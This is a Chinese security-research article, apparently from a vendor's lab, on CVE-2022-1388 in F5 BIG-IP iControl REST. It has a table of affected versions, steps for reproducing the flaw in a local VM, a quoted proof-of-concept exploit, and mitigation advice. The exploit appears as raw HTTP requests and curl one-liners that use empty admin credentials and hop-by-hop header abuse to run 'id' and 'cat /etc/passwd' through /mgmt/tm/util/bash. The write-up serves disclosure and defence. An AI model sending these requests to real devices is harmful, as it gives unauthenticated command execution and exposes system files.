> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/o6Hpl_sL_xOM_TDIFHrSZg)

CVE-2022-1388：BIG-IP iControl REST 漏洞
-------------------------------------

  

**影 响**

  

  

> **Impact**
> 
> This vulnerability may allow an unauthenticated attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands, create or delete files, or disable services. There is no data plane exposure; this is a control plane issue only.

  

根据官方描述得知，该漏洞允许未授权的攻击者通过接口对BIG-IP系统访问，并能执行任意系统命令、创建、删除文件以及关闭服务。

<table style="width: 768px; visibility: visible;" width="703"><thead style="box-sizing: border-box; background-color: rgb(248, 248, 248); visibility: visible;"><tr cid="n10" mdtype="table_row" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-color: rgb(223, 226, 229); border-style: solid; border-width: 1px; visibility: visible;"><td style="word-break: break-all; visibility: visible;">产品</td><td style="word-break: break-all; visibility: visible;">分支</td><td style="word-break: break-all; visibility: visible;">受影响版本</td><td style="word-break: break-all; visibility: visible;">Fixes introduced in3</td><td style="word-break: break-all; visibility: visible;">漏洞威胁等级</td><td style="word-break: break-all; visibility: visible;">CVSSv3 评分</td></tr></thead><tbody style="box-sizing: border-box; visibility: visible;"><tr cid="n17" mdtype="table_row" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-color: rgb(223, 226, 229); border-style: solid; border-width: 1px; visibility: visible;"><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">BIG-IP (all modules)</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">17.x</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">None</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">17.0.0</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">严重</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">9.8</section></td></tr><tr cid="n24" mdtype="table_row" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-color: rgb(223, 226, 229); border-style: solid; border-width: 1px; background-color: rgb(248, 248, 248); visibility: visible;"><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><br style="visibility: visible;"></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">16.x</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">16.1.0 - 16.1.2</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">16.1.2.2</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><br style="visibility: visible;"></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><br style="visibility: visible;"></td></tr><tr cid="n31" mdtype="table_row" style="box-sizing: border-box; break-inside: avoid; break-after: auto; border-color: rgb(223, 226, 229); border-style: solid; border-width: 1px; visibility: visible;"><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><br style="visibility: visible;"></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">15.x</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">15.1.0 - 15.1.5</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><section style="margin-left: 8px; margin-right: 8px; visibility: visible;">15.1.5.1</section></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><br style="visibility: visible;"></td><td style="box-sizing: border-box; padding: 6px 13px; border-color: rgb(223, 226, 229); min-width: 32px; visibility: visible;"><br style="visibility: visible;"></td></tr><tr cid="n38" mdtype="table_row" style="box-sizing: border-box;break-inside: avoid;break-after: auto;border-color: rgb(223, 226, 229);border-style: solid;border-width: 1px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">14.x</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">14.1.0 - 14.1.4</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">14.1.4.6</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td></tr><tr cid="n45" mdtype="table_row" style="box-sizing: border-box;break-inside: avoid;break-after: auto;border-color: rgb(223, 226, 229);border-style: solid;border-width: 1px;"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">13.x</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">13.1.0 - 13.1.4</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">13.1.5</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td></tr><tr cid="n52" mdtype="table_row" style="box-sizing: border-box;break-inside: avoid;break-after: auto;border-color: rgb(223, 226, 229);border-style: solid;border-width: 1px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">12.x</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">12.1.0 - 12.1.6</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">官方无补丁</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td></tr><tr cid="n59" mdtype="table_row" style="box-sizing: border-box;break-inside: avoid;break-after: auto;border-color: rgb(223, 226, 229);border-style: solid;border-width: 1px;"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">11.x</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">11.6.1-11.6.5</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><section style="margin-left: 8px;margin-right: 8px;">官方无补丁</section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(223, 226, 229);min-width: 32px;"><br></td></tr></tbody></table>

  

**复 现**

  

  

从官网https://downloads.f5.com/esd/productlines.jsp下载4个版本虚拟镜像，本地复现：

选择镜像需要在受影响版本内的虚拟机ova包，

![图片](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTsMOUM1Ikseib5c5icFseOLzDyf3zRLPCiaBXztz61HkAIUseHGhzNtFVmMrXIKK0pPKMIic0cXVibNyA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

下载好的镜像，直接双击打卡导入，或者在虚拟机中选择导入均可：  

![图片](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTsMOUM1Ikseib5c5icFseOLzguDvfyCFkib4uxibzqhj58gUFibiaBT3l1Mj9XWcKSwfAWXPe5tPLyXu5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTsMOUM1Ikseib5c5icFseOLziag8uNnr4ico86wCzZxW7yteAm3SGYYpc0Co2icia4OttjpvWLQloXHdZw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

导入完成后打开该虚拟机，需要获取该虚拟机的ip，终端输入`root/default`登录后输入`ifconfig mgmt`即可查看ip

![图片](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTsMOUM1Ikseib5c5icFseOLzjciaRrzAKHpeas2dFLt1IIu8GSbc7ZV82dD0j9McmTN1rUnYx82w8fQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTsMOUM1Ikseib5c5icFseOLzzYK68fRywC7tiaUR6ddDLsdEoS5EtC4P7x4ZIrkxYrThnype4IoN84g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

然后在浏览器输入`https://<ip>`打开看到登录界面抓包即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTsMOUM1Ikseib5c5icFseOLzDMjCtNcpfWc6qxbxib8QNDicictZdTSMMLIITqxbeuWJbbt435y0AHic8g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

参考https://packetstormsecurity.com/files/167007/F5-BIG-IP-Remote-Code-Execution.html的exp如下：

```


# F5 BIG-IP RCE exploitation (CVE-2022-1388)  
  
POST (1):   
  
POST /mgmt/tm/util/bash HTTP/1.1  
Host: <redacted>:8443  
Authorization: Basic YWRtaW46  
Connection: keep-alive, X-F5-Auth-Token  
X-F5-Auth-Token: 0  
  
{"command": "run" , "utilCmdArgs": " -c 'id' " }  
  
curl commandliner:   
  
$ curl -i -s -k -X $'POST'  
-H $'Host: <redacted>:8443'   
-H $'Authorization: Basic YWRtaW46'   
-H $'Connection: keep-alive, X-F5-Auth-Token'   
-H $'X-F5-Auth-Token: 0'   
-H $'Content-Length: 52'   
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \'id\' \" }\x0d\x0a'  
$'https://<redacted>:8443/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080  
  
  
POST (2):  
  
POST /mgmt/tm/util/bash HTTP/1.1  
Host: <redateced>:8443  
Authorization: Basic YWRtaW46  
Connection: keep-alive, X-F5-Auth-Token  
X-F5-Auth-Token: 0  
  
{"command": "run" , "utilCmdArgs": " -c ' cat /etc/passwd' " }  
  
curl commandliner:  
  
$ curl -i -s -k -X $'POST'  
-H $'Host: <redacted>:8443'   
-H $'Authorization: Basic YWRtaW46' -H $'Connection: keep-alive, X-F5-Auth-Token'   
-H $'X-F5-Auth-Token: 0'  
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \' cat /etc/passwd\' \" }\x0d\x0a\x0d\x0a'  
$'https://<redacted>/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080  



```

问题可能与使用空凭据`admin:`绕过了前端和后端身份验证有关，以及HTTP的 hop_by_hop请求头问题:

https://portswigger.net/research/top-10-web-hacking-techniques-of-2019-nominations-open

https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers

HTTP的 hop_by_hop请求头问题，大概意思就是讲：

请求还可以定义一组自定义的标头，通过将它们添加到标头中来逐跳处理`Connection`，如下所示：

```


Connection: close, X-Foo, X-Bar


```

在此示例中，我们要求代理将`X-Foo`和`X-Bar`作为逐跳处理，这意味着我们希望代理在传递请求之前将它们从请求中删除。

复现过程中发现只有14.x-16.x版本的请求头需要为`Host:localhost`才可以。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**修 复 方 案**

  

  

建议升级只最新版本或可参考官方修复建议：https://support.f5.com/csp/article/K23605346 的`Recommended Actions`

在受影响的版本内可执行以下步骤以缓解攻击：

**通过自身 IP 地址阻止 iControl REST 访问**

**通过管理界面阻止 iControl REST 访问**

**修改 BIG-IP httpd 配置**

  

**参 考 链 接**

  

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388

https://support.f5.com/csp/article/K23605346

https://packetstormsecurity.com/files/167007/F5-BIG-IP-Remote-Code-Execution.html

https://portswigger.net/research/top-10-web-hacking-techniques-of-2019-nominations-open

https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers

 ![](http://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSZmibNONzibea8WkcAFcdQcXicIYgWuvOtR8HqlqJ68Avib679FBGHYqxRibldppr6etXJxxWRrlBToiaw/0?wx_fmt=png) ** 山石网科安全技术研究院 ** 山石网科安全技术研究院简称“山石安研院”正式成立于2020年4月，是山石网科的信息安全智库部门，山石安研院旗下包括干将、莫邪两大安全实验室，以及安全预警分析、高端攻防培训两支独立的技术团队。 343篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)